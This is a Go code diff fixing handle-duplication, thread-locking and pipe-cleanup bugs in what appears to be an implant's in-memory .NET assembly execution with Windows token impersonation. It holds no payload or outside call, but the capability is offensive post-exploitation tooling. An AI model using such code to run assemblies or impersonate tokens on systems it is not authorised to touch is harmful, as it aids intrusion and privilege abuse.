@@ -152,10 +152,10 @@ func applyAssemblyTokenContextWithDuplication(tokenContext *AssemblyTokenContext
 			)
 
 			if err2 != nil {
-				// As last resort, use the original handle
-				duplicatedToken = currentNetOnlyHandle
-				cleanupFunc = func() {
-				}
+				// Both DuplicateTokenEx attempts failed -- do NOT fall back to
+				// the shared handle (unsafe concurrent use / double-close).
+				// Continue without token impersonation.
+				return func() {}, 0
 			} else {
 				cleanupFunc = func() {
 					CloseHandle(duplicatedToken)
@@ -188,14 +188,13 @@ func applyAssemblyTokenContextWithDuplication(tokenContext *AssemblyTokenContext
 			)
 
 			if err != nil {
-				// Fall back to using the original handle
-				duplicatedToken = token
-				cleanupFunc = func() {
-				}
-			} else {
-				cleanupFunc = func() {
-					CloseHandle(duplicatedToken)
-				}
+				// DuplicateTokenEx failed -- do NOT fall back to the shared
+				// handle (unsafe concurrent use / double-close).
+				// Continue without token impersonation.
+				return func() {}, 0
+			}
+			cleanupFunc = func() {
+				CloseHandle(duplicatedToken)
 			}
 
 			return cleanupFunc, duplicatedToken
@@ -345,7 +344,11 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 			resultChan <- execResult{retCode, err}
 			return
 		}
-		defer syscall.CloseHandle(readPipe)
+		defer func() {
+			if readPipe != syscall.InvalidHandle {
+				syscall.CloseHandle(readPipe)
+			}
+		}()
 
 		// Save original handles
 		origStdout, _, _ := getStdHandle.Call(STD_OUTPUT_HANDLE_ASYNC)
@@ -417,6 +420,10 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 
 		execDone := make(chan bool)
 		go func() {
+			// Lock this goroutine to its OS thread so token impersonation
+			// (which is per-thread) is not lost to goroutine migration.
+			runtime.LockOSThread()
+			defer runtime.UnlockOSThread()
 			defer func() {
 				if r := recover(); r != nil {
 					// Check if it's an expected exit (like from /runfor)
@@ -431,7 +438,7 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 				execDone <- true
 			}()
 
-			// ADD IMPERSONATION HERE, in the same goroutine as the assembly execution
+			// Apply impersonation in this goroutine for the assembly execution
 			if duplicatedTokenHandle != 0 {
 				err := ImpersonateLoggedOnUser(duplicatedTokenHandle)
 				if err != nil {
@@ -466,6 +473,17 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 		select {
 		case <-readerDone:
 		case <-time.After(2 * time.Second):
+			// Reader goroutine is likely blocked in a Windows ReadFile
+			// syscall which cannot observe the stopReader channel.
+			// Close the read end of the pipe to force ReadFile to return
+			// with an error, allowing the goroutine to exit cleanly.
+			syscall.CloseHandle(readPipe)
+			readPipe = syscall.InvalidHandle // prevent the deferred close from double-closing
+			// Give the reader a moment to notice the broken pipe
+			select {
+			case <-readerDone:
+			case <-time.After(500 * time.Millisecond):
+			}
 		}
 
 		// Restore handles
@@ -546,6 +564,10 @@ func (c *InlineAssemblyAsyncCommand) executeProtectedDirect(assemblyBytes []byte
 	done := make(chan bool)
 
 	go func() {
+		// Lock this goroutine to its OS thread so token impersonation
+		// (which is per-thread) is not lost to goroutine migration.
+		runtime.LockOSThread()
+		defer runtime.UnlockOSThread()
 		defer func() {
 			if r := recover(); r != nil {
 				execErr = nil
